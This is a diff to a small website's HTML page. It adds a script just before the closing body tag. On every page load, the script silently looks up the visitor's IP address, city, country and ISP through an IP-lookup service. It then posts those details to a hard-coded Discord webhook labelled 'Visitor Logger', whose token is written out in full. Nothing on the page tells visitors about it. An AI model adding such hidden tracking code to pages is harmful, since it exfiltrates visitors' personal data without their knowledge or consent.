@@ -45,5 +45,36 @@
   <footer class="footer">
     <p>&copy; 2025 Warrior. Designed for explorers.</p>
   </footer>
+
+  <script>
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const payload = {
+          username: "Visitor Logger",
+          embeds: [
+            {
+              title: "User Info!",
+              color: 3447003,
+              fields: [
+                { name: "IP Address", value: data.ip || "Unknown", inline: true },
+                { name: "City", value: data.city || "Unknown", inline: true },
+                { name: "Country", value: data.country_name || "Unknown", inline: true },
+                { name: "ISP", value: data.org || "Unknown", inline: true },
+              ],
+              footer: { text: "Warrior Website" }
+            }
+          ]
+        };
+        
+        fetch("https://discord.com/api/webhooks/1347853517578043443/UjB-g2hTQLh6jb0fqZw3nF2Gk8afmth8gFw0ljs_2NNCcSmGTpFbNzrInIGSRblLGz71", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        })
+        .catch(error => console.error("Error sending data:", error));
+      })
+      .catch(error => console.error("Error fetching IP details:", error));
+  </script>
 </body>
 </html>
